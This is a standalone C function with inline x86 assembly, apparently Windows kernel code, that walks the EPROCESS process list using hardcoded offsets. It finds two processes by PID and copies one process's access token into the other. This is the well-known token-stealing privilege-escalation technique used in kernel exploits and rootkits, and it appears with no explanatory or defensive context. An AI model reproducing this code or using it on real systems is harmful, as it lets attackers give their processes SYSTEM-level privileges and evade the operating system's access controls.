NTSTATUS SwapAccessToken(DWORD dwDstPid, DWORD dwSrcPid)
{
     DWORD dwStartingEPROCESS = 0;
     DWORD dwDstEPROCESS = 0;
     DWORD dwSrcEPROCESS  = 0;
     DWORD dwRetValue = 0;
     DWORD dwActiveProcessLinksOffset = 0x88;
     DWORD dwTokenOffset = 0xC8;
     DWORD dwDelta = dwTokenOffset - dwActiveProcessLinksOffset;

     _asm
     {
          pushad
          mov eax, fs:[0x124]
          mov eax, [eax+0x44]
          add eax, dwActiveProcessLinksOffset
          mov dwStartingEPROCESS, eax

CompareSrcPid:
          
          mov ebx, [eax - 0x4]
          cmp ebx, dwSrcPid
          jne CompareDstPid
          mov dwSrcEPROCESS, eax

CompareDstPid:
          
          cmp ebx, dwDstPid
          jne AreWeDone
          mov dwDstEPROCESS, eax

AreWeDone:
          
          mov edx, dwDstEPROCESS
          and edx, dwSrcEPROCESS
          test edx, edx
          jne SwapToken
          mov eax, [eax]
          cmp eax, dwStartingEPROCESS
          jne CompareSrcPid
          mov dwRetValue, 0xC000000F
          jmp WeAreDone

SwapToken:     

          mov eax, dwSrcEPROCESS
          mov ecx, dwDelta
          add eax, ecx
          mov eax, [eax]
          mov ebx, dwDstEPROCESS
          mov [ebx + ecx], eax

WeAreDone:   
          
          popad
     }

     return dwRetValue;
}
